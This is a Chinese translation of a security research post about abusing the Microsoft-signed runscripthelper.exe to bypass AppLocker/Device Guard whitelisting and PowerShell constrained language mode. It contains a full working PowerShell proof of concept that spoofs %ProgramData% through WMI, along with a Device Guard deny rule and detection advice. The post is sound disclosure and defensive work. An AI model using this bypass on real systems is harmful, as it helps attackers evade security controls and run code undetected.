@@ -1,0 +1,357 @@
+# 【技术分享】如何利用runscripthelper.exe绕过应用程序白名单机制
+
+阅读量 **114327**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-11-08 10:10:42
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：specterops.io
+
+原文地址：<https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
+
+预估稿费：200RMB
+
+投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
+
+**一、简介**
+
+在实践[PowerShell课程](https://specterops.io/how-we-help/training-offerings/adversary-tactics-powershell)中的某个实验时，我偶然发现了System32目录下存在一个PowerShell宿主进程，该程序为runscripthelper.exe，经过微软的签名。Windows
+10
+RS3系统中刚刚引入这个程序，其功能是从特定目录读取PowerShell代码并加以执行。这种执行PowerShell代码的方式有一些副作用，我们可以借此绕过[受限语言模式](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-5.1)的限制。
+
+反编译runscripthelper.exe后，其入口点如下所示：
+
+    
+    
+    private static int Main(string[] args)
+    {
+     try
+     {
+      if (args.Length != 3)
+      {
+       throw new Exception("Invalid command line");
+      }
+      string text = args[0];
+      string text2 = args[1];
+      string text3 = args[2];
+      if (string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text3))
+      {
+       throw new Exception("Invalid args");
+      }
+      if (!Program.k_scriptSet.Contains(text))
+      {
+       throw new Exception("Unknown script");
+      }
+      string text4 = Environment.ExpandEnvironmentVariables(Program.k_utcScriptPath);
+      if (text2.Length <= text4.Length || !text4.Equals(text2.Substring(0, text4.Length), StringComparison.OrdinalIgnoreCase))
+      {
+       throw new Exception("Unknown script path: " + text2);
+      }
+      text2 = Program.GetShortPath(text2);
+      text3 = Program.GetShortPath(text3);
+      if (text.CompareTo("surfacecheck") == 0)
+      {
+       SurfaceCheckProcessor.ProcessSurfaceCheckScript(text2, text3);
+      }
+     }
+     catch (Exception ex)
+     {
+      Console.WriteLine("Exception occurred: " + ex.Message);
+      Console.WriteLine("Inner Exception: " + ex.InnerException);
+      return -1;
+     }
+     return 0;
+    }
+
+如你所见， 该程序接受三个命令行参数：  
+
+1、参数#1必须与"surfacecheck"字符串匹配，才能执行ProcessSurfaceCheckScript方法，这个方法会接收传入的第2及第3个参数。
+
+2、参数#2包含待执行脚本的完整路径，并且会跟“k_utcScriptPath”全局变量进行比较（“k_utcScriptPath”这个环境变量展开后为“\?%ProgramData%MicrosoftDiagnosisscripts”）。
+
+3、参数#3为一个已有目录的具体路径，命令输出结果会保存到该目录。
+
+根据上述代码，待执行的脚本似乎必须位于%ProgramData%MicrosoftDiagnosisscripts目录中。默认情况下（至少在我当前系统下），普通用户不具备对该目录的写入权限。而理想情况下，我更希望能以非特权用户身份来绕过受限环境。因此，如果我能在runscripthelper.exe启动时以某种方式控制%ProgramData%的内容，我应该可以让该程序从可控的目录中执行脚本。待会我们再回到这个主题，现在我们可以先分析一下ProcessSurfaceCheckScript方法，看看它执行的是哪些内容：
+
+    
+    
+    public static void ProcessSurfaceCheckScript(string scriptPath, string outputPath)
+    {
+     if (!File.Exists(scriptPath))
+     {
+      throw new Exception("Script does not exist");
+     }
+     if (!Directory.Exists(outputPath))
+     {
+      throw new Exception("Output path does not exist");
+     }
+     PowerShell powerShell = PowerShell.Create();
+     powerShell.AddScript("Set-ExecutionPolicy -Scope Process unrestricted");
+     powerShell.AddScript("$InvokedFromUIF = $true");
+     powerShell.AddScript("$FailureText = "UIF"");
+     powerShell.AddScript("$ScriptPath = "" + Path.GetDirectoryName(scriptPath) + """);
+     powerShell.AddScript("$LogDir = "" + outputPath + """);
+     SurfaceCheckProcessor.ReadCmdlets(powerShell, scriptPath);
+     string script = File.ReadAllText(scriptPath);
+     powerShell.AddScript(script);
+     powerShell.Invoke();
+     if (powerShell.HadErrors)
+     {
+      foreach (ErrorRecord current in powerShell.Streams.Error)
+      {
+       Console.WriteLine("Error: " + current);
+       Console.WriteLine("Exception: " + current.Exception);
+       Console.WriteLine("Inner Exception: " + current.Exception.InnerException);
+      }
+     }
+    }
+
+因此，从代码表面上来看，ProcessSurfaceCheckScript方法的功能是读取脚本的内容并加以执行（顺便提一下，该方法并不在意脚本的文件扩展名）。在运行AppLocker或者Device
+Guard的系统上（现在Device Guard已改名为Windows Defender Application
+control），由于程序的发布者为微软，因此该程序很有可能会被添加到白名单中，该进程中执行的任何PowerShell代码都会以全语言模式（full
+language mode）执行，因此攻击者可以绕过受限语言模式的限制。  
+
+**  
+**
+
+**二、利用方法**
+
+作为一名攻击者，我们需要控制%ProgramData%的内容，将其指向我们能控制的某个目录。想完成这个任务可以有多种方法，我所知道的一种方法就是在调用[Win32进程创建函数](https://msdn.microsoft.com/en-us/library/aa389388\(v=vs.85\).aspx)时，设置[Win32_ProcessStartup](https://msdn.microsoft.com/en-us/library/aa394375\(v=vs.85\).aspx)类实例中的EnvironmentVariables属性。此外，WMI还提供了远程调用功能，这个功能有许多好处，并且有几个WMI宿主应用不大可能会被应用白名单机制所阻拦。与此同时，如果你没有传入程序预期的许多环境变量，许多子进程就无法正常加载。
+
+成功控制传递给runscripthelper.exe的环境变量后，我们可以使用如下命令来执行我们的载荷：
+
+    
+    
+    runscripthelper.exe surfacecheck \?C:TestMicrosoftDiagnosisscriptstest.txt C:Test
+
+能够绕过限制机制的完整PowerShell代码如下所示：
+
+    
+    
+    function Invoke-RunScriptHelperExpression {
+    <#
+    .SYNOPSIS
+    Executes PowerShell code in full language mode in the context of runscripthelper.exe.
+    .DESCRIPTION
+    Invoke-RunScriptHelperExpression executes PowerShell code in the context of runscripthelper.exe - a Windows-signed PowerShell host application which appears to be used for telemetry collection purposes. The PowerShell code supplied will run in FullLanguage mode and bypass constrained language mode.
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
+    .PARAMETER ScriptBlock
+    Specifies the PowerShell code to execute in the context of runscripthelper.exe
+    .PARAMETER RootDirectory
+    Specifies the root directory where the "MicrosoftDiagnosisscripts" directory structure will be created. -RootDirectory defaults to the current directory.
+    .PARAMETER ScriptFileName
+    Specifies the name of the PowerShell script to be executed. The script file can be any file extension. -ScriptFileName defaults to test.txt.
+    .PARAMETER HideWindow
+    Because Invoke-RunScriptHelperExpression launches a child process in a new window (due to how Win32_Process.Create works), -HideWindow launches a hidden window.
+    .EXAMPLE
+    $Payload = {
+        # Since this is running inside a console app,
+        # you need the Console class to write to the screen.
+        [Console]::WriteLine('Hello, world!')
+        $LanguageMode = $ExecutionContext.SessionState.LanguageMode
+        [Console]::WriteLine("My current language mode: $LanguageMode")
+        # Trick to keep the console window up
+        $null = [Console]::ReadKey()
+    }
+    Invoke-RunScriptHelperExpression -ScriptBlock $Payload
+    .OUTPUTS
+    System.Diagnostics.Process
+    Outputs a process object for runscripthelper.exe. This is useful if it later needs to be killed manually with Stop-Process.
+    #>
+        [CmdletBinding()]
+        [OutputType([System.Diagnostics.Process])]
+        param (
+            [Parameter(Mandatory = $True)]
+            [ScriptBlock]
+            $ScriptBlock,
+            [String]
+            [ValidateNotNullOrEmpty()]
+            $RootDirectory = $PWD,
+            [String]
+            [ValidateNotNullOrEmpty()]
+            $ScriptFileName = 'test.txt',
+            [Switch]
+            $HideWindow
+        )
+        $RunscriptHelperPath = "$Env:windirSystem32runscripthelper.exe"
+        # Validate that runscripthelper.exe is present
+        $null = Get-Item -Path $RunscriptHelperPath -ErrorAction Stop
+        # Optional: Since not all systems will have runscripthelper.exe, you could compress and
+        # encode the binary here and then drop it. That's up to you. This is just a PoC.
+        $ScriptDirFullPath = Join-Path -Path (Resolve-Path -Path $RootDirectory) -ChildPath 'MicrosoftDiagnosisscripts'
+        Write-Verbose "Script will be saved to: $ScriptDirFullPath"
+        # Create the directory path expected by runscripthelper.exe
+        if (-not (Test-Path -Path $ScriptDirFullPath)) {
+            $ScriptDir = mkdir -Path $ScriptDirFullPath -ErrorAction Stop
+        } else {
+            $ScriptDir = Get-Item -Path $ScriptDirFullPath -ErrorAction Stop
+        }
+        $ScriptFullPath = "$ScriptDirFullPath$ScriptFileName"
+        # Write the payload to disk - a requirement of runscripthelper.exe
+        Out-File -InputObject $ScriptBlock.ToString() -FilePath $ScriptFullPath -Force
+        $CustomProgramFiles = "ProgramData=$(Resolve-Path -Path $RootDirectory)"
+        Write-Verbose "Using the following for %ProgramData%: $CustomProgramFiles"
+        # Gather up all existing environment variables except %ProgramData%. We're going to supply our own, attacker controlled path.
+        [String[]] $AllEnvVarsExceptLockdownPolicy = Get-ChildItem Env:* -Exclude 'ProgramData' | % { "$($_.Name)=$($_.Value)" }
+        
+        # Attacker-controlled %ProgramData% being passed to the child process.
+        $AllEnvVarsExceptLockdownPolicy += $CustomProgramFiles
+        # These are all the environment variables that will be explicitly passed on to runscripthelper.exe
+        $StartParamProperties = @{ EnvironmentVariables = $AllEnvVarsExceptLockdownPolicy }
+        $Hidden = [UInt16] 0
+        if ($HideWindow) { $StartParamProperties['ShowWindow'] = $Hidden }
+        $StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties
+        $RunscriptHelperCmdline = "$RunscriptHelperPath surfacecheck \?$ScriptFullPath $ScriptDirFullPath"
+        Write-Verbose "Invoking the following command: $RunscriptHelperCmdline"
+        # Give runscripthelper.exe what it needs to execute our malicious PowerShell.
+        $Result = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
+            CommandLine = $RunscriptHelperCmdline
+            ProcessStartupInformation = $StartParams
+        }
+        if ($Result.ReturnValue -ne 0) {
+            throw "Failed to start runscripthelper.exe"
+            return
+        }
+        $Process = Get-Process -Id $Result.ProcessId
+        $Process
+        # When runscripthelper.exe exits, clean up the script and the directories.
+        # I'm using proper eventing here because if you immediately delete the script from
+        # disk then it will be gone before runscripthelper.exe has an opportunity to execute it.
+        $Event = Register-ObjectEvent -InputObject $Process -EventName Exited -SourceIdentifier 'RunscripthelperStopped' -MessageData "$RootDirectoryMicrosoft" -Action {
+            Remove-Item -Path $Event.MessageData -Recurse -Force
+            Unregister-Event -SourceIdentifier $EventSubscriber.SourceIdentifier
+        }
+    }
+
+不使用PowerShell我们也能绕过应用程序白名单机制，比如，我们可以使用wbemtest.exe（该程序为WQL测试工具）完成这个任务，演示视频如下：  
+
+在wbemtest.exe这个例子中，我的载荷存放在C:TestMicrosoftDiagnosisscriptstest.txt中。此外，我所使用的环境变量如下所示：
+
+    
+    
+    “LOCALAPPDATA=C:\Test”
+    “Path=C:\WINDOWS\system32;C:\WINDOWS”
+    “SystemRoot=C:\WINDOWS”
+    “SESSIONNAME=Console”
+    “CommonProgramFiles=C:\Program Files\Common Files”
+    “SystemDrive=C:”
+    “TEMP=C:\Test”
+    “ProgramFiles=C:\Program Files”
+    “TMP=C:\Test”
+    “windir=C:\WINDOWS”
+    “ProgramData=C:\Test”
+
+  
+
+**三、防御措施**
+
+如果使用的是Device Guard（现在是Windows Defender Application
+Control），你可以在已有的策略中添加如下规则来阻止这个二进制文件，可参考[此链接](http://www.exploit-monday.com/2016/09/using-device-guard-to-mitigate-against.html)了解添加规则的具体步骤：
+
+    
+    
+    <?xml version="1.0" encoding="utf-8"?>
+    <SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy">
+      <VersionEx>10.0.0.0</VersionEx>
+      <PolicyTypeID>{A244370E-44C9-4C06-B551-F6016E563076}</PolicyTypeID>
+      <PlatformID>{2E07F7E4-194C-4D20-B7C9-6F44A6C5A234}</PlatformID>
+      <Rules>
+        <Rule>
+          <Option>Enabled:Unsigned System Integrity Policy</Option>
+        </Rule>
+      </Rules>
+      <!--EKUS-->
+      <EKUs />
+      <!--File Rules-->
+      <FileRules>
+        <Deny ID="ID_DENY_D_1" FriendlyName="runscripthelper.exe FileRule" FileName="runscripthelper.exe" MinimumFileVersion="65535.65535.65535.65535" />
+      </FileRules>
+      <!--Signers-->
+      <Signers />
+      <!--Driver Signing Scenarios-->
+      <SigningScenarios>
+        <SigningScenario Value="12" ID="ID_SIGNINGSCENARIO_WINDOWS" FriendlyName="runscripthelper.exe bypass mitigation">
+          <ProductSigners>
+            <FileRulesRef>
+              <FileRuleRef RuleID="ID_DENY_D_1" />
+            </FileRulesRef>
+          </ProductSigners>
+        </SigningScenario>
+      </SigningScenarios>
+      <UpdatePolicySigners />
+      <CiSigners />
+      <HvciOptions>0</HvciOptions>
+    </SiPolicy>
+
+  
+
+**四、如何检测**
+
+与其他PowerShell宿主进程一样，在脚本块（scriptblock）日志中会记录通过runscripthelper.exe执行PowerShell代码的动作，对应的事件为[4014事件](https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/)。
+
+此外，“Windows PowerShell”日志中的400事件也会捕捉到runscripthelper.exe所对应的命令行上下文信息。
+
+**五、何为runscripthelper.exe**
+
+什么是runscripthelper.exe？该文件中的如下字符串引起了我的注意：
+
+    
+    
+    InvokedFromUIF
+    k_utcScriptPath
+
+Google一番后，我发现UIF代表“User Initiated Feedback（用户发起的反馈）”，而UTF代表“Unified Telemetry
+Client（统一遥测客户端）”。因此从字面上看，这个二进制文件是某种远程数据收集程序。为了避免微软向我的电脑推送并执行未经签名的PowerShell代码（并且这些代码很可能没有任何质量保证），我非常乐意在Device
+Guard代码完整性策略中阻止这个二进制程序的运行。  
+
+**  
+**
+
+**六、总结**
+
+因此，本文分析的这个签名应用可以被攻击者恶意滥用，经过进一步分析，我们发现系统并没有限制这类程序的使用场景，因为每次Windows发布新版时都会引入新的应用程序。这个事实也再次证实应用白名单（application
+whitelisting，AWL）仍然面临许多难题，其中一个基本的难题就是，如果我们想让一个可启动的、实用的系统保持最新状态，我们往往需要将经过微软签名的任何代码列入白名单中。这种决策会带来一些副作用，如果某些人在白名单维护方面态度非常严格，那么他们就需要实时关注像本文之类的文章，相应地更新黑名单规则。在白名单机制的基础上，使用这种黑名单规则可以取得很好的效果。然而想要维护这样一个黑名单并不是一件容易的事情，因为这个名单随着时间的推进会不断增长。需要明确的是，这一点并不是AWL的缺陷，只能算是AWL面临的一个挑战。我个人也会使用AWL，对这种机制的有效性也十分满意。绝大多数攻击者仍然会使用不可信的脚本或程序，在这种场景中，即使最基本的白名单策略应付起来也能游刃有余。
+
+把AWL的事先放在一边不谈，单凭这类程序，攻击者就可以隐藏在良性的、“可信的”应用程序背后。因此，通过这个例子，我们需要总结出一个道理：白名单绕过技术是攻击者在后续攻击过程中的一大帮手，无论AWL机制是否存在，我们都应该对此有所警觉。
+
+最后说一下，如果有人偶然发现微软向runscriphelper.exe推送了任何PowerShell代码，请上传这段代码并及时告诉我，不胜感激！
+
+本文翻译自specterops.io [原文链接](https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **興趣使然的小胃** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/87183](/post/id/87183)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [specterops.io](https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc)
+
+如若转载,请注明出处： <https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
